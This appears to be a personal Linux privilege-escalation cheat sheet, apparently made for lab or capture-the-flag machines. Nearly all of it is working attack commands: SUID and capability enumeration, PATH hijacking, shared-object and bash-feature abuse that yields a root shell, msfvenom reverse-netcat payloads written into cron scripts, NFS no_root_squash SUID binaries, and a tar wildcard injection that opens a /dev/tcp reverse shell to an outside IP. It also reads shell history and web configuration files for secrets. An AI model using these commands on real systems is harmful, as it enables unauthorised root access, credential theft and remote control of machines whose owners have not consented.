less secret.txt
cat /var/www/html/configuration.php
cat ~/.*history | less
sudo -l

# Checklist
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
# https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist

#https://gtfobins.github.io/

# SUID
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
# Capabilies
getcap -r /

cd /tmp/
echo /bin/sh > ps
chmod +x ps
export PATH=/tmp:$PATH

cd /tmp
echo echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
# real "ls" => "/bin/ls"
# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH

#vim edytor
sudo -l
/usr/bin/vi
:!sh
:quit

# shared obiect
/usr/local/bin/suid-so
# open/access/notfile
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
mkdir /home/user/.config
# create bash file
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/service.c
/usr/local/bin/suid-so

# enviroment variables
strings /usr/local/bin/suid-env
# service apache2 start
gcc -o service /home/user/tools/suid/service.c
PATH=.:$PATH /usr/local/bin/suid-env
/usr/local/bin/suid-env

# Abusing shell features
strings /usr/local/bin/suid-env2
# /usr/sbin/service apache2 start
/bin/bash --version # <4.2-048
# create bash function named "service"
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2

# Abusing shell features 2
/bin/bash --version # <4.4
# bash debuging 
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p

msfvenom -p cmd/unix/reverse_netcat lhost=10.14.84.79 lport=8888 R
cat /etc/crontab
echo [MSFVENOM OUTPUT] > autoscript.sh

cat /etc/exports
# if exist create and mount "no_root_squash"
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
# create and run SUID shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
/tmp/shell.elf

# karnel exploit
# https://github.com/jondonas/linux-exploit-suggester-2

# tar wildcard "*"
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.14.84.79/4443 0>&1'" > shell.sh
chmod +x shell.sh
chmod 777 shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1

chmod o+wx backup.sh
sudo -u michael /opt/backups/backup.sh

# suid bash
./.suid_bash -p

